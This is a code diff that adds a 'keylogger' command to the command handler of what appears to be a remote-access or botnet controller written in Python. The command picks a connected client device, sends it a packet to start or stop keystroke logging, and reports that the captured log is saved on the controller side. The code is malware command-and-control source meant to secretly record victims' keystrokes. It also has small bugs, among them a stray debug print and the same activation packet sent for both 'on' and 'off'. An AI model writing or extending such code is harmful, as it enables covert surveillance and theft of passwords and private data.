@@ -223,5 +223,24 @@ class CommandHandler:
         ...
 
     @command(['keylogger'], accept_args = True)
-    def keylogger(self) -> None:
-        ...
+    def keylogger(self, *args) -> None:
+
+        if not (args[1] in ['on', 'off'] if len(args) == 2 else False):
+            logger.error('Command usage: keylogger [client ID] [on | off]')
+            return
+
+        print("Passed")
+        selectedClient: Union['ClientDevice', None] = self.NetServer._selectedClient \
+            if self.NetServer._selectedClient else self.bucket.get_client_by_id(args)
+
+        if (selectedClient is None):
+            logger.error('Client not found'); return
+
+        selectedClient.socket.send_packet('keylogger_activate')
+        response = selectedClient.socket.receive_packet()
+
+        if (response == '0'):
+            logger.success('Keylogger has been activated, log will be saved on clients/responses/keylogger.log')
+            return
+
+        logger.success('Keylogger sucessfully turned off')
